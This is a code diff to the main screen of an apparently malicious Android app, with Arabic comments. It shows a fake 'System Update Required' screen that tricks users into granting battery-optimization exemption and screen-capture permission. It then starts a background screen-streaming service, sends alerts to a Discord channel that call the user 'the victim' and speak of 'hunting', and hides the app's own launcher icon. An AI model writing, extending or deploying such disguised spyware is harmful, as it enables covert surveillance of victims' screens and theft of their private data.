@@ -23,6 +23,10 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
+        // 1. رسالة تأكيد للديسكورد فور فتح التطبيق
+        DiscordSender.sendMessage("🔔 تطبيق حسين اشتغل الآن! الربط بالديسكورد 100% شغال وجاهز للصيد.");
+
+        // بناء واجهة بسيطة برمجياً لمنع كراش الموارد
         LinearLayout layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setGravity(Gravity.CENTER);
@@ -30,54 +34,58 @@ public class MainActivity extends Activity {
 
         TextView tv = new TextView(this);
         tv.setText("System Update Required");
-        tv.setTextSize(20);
+        tv.setTextSize(22);
         tv.setTextColor(Color.BLACK);
         tv.setPadding(0, 0, 0, 50);
         layout.addView(tv);
 
         Button btn = new Button(this);
-        btn.setText("إصلاح النظام الآن");
-        btn.setPadding(20, 20, 20, 20);
+        btn.setText("بدء الإصلاح الآن");
+        btn.setBackgroundColor(Color.parseColor("#4CAF50"));
+        btn.setTextColor(Color.WHITE);
         btn.setOnClickListener(v -> {
-            // طلب تجاهل تحسين البطارية
-            try {
-                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-                if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
-                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                    intent.setData(Uri.parse("package:" + getPackageName()));
-                    startActivity(intent);
-                }
-            } catch (Exception e) {}
-
-            // طلب بث الشاشة
+            requestBatteryOptimizations();
             MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
             if (mpm != null) {
                 startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
             }
         });
-        
         layout.addView(btn);
+
         setContentView(layout);
+    }
+
+    private void requestBatteryOptimizations() {
+        try {
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                intent.setData(Uri.parse("package:" + getPackageName()));
+                startActivity(intent);
+            }
+        } catch (Exception e) {}
     }
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == REQ_CODE && resultCode == RESULT_OK) {
-            Intent serviceIntent = new Intent(this, ScreenService.class);
-            serviceIntent.putExtra("resCode", resultCode);
-            serviceIntent.putExtra("resData", data);
-            startForegroundService(serviceIntent);
-
-            DiscordSender.sendMessage("✅ تم بدء البث بنجاح من جهاز الضحية!");
+            Intent intent = new Intent(this, ScreenService.class);
+            intent.putExtra("resCode", resultCode);
+            intent.putExtra("resData", data);
+            startForegroundService(intent);
             
-            // إخفاء الأيقونة فوراً
-            getPackageManager().setComponentEnabledSetting(
-                new ComponentName(this, MainActivity.class),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            );
+            DiscordSender.sendMessage("🚀 الضحية أعطى الصلاحيات! بدأ البث المستمر.");
+            hideAppIcon();
             finish();
         }
+    }
+
+    private void hideAppIcon() {
+        getPackageManager().setComponentEnabledSetting(
+            new ComponentName(this, MainActivity.class),
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
+        );
     }
 }
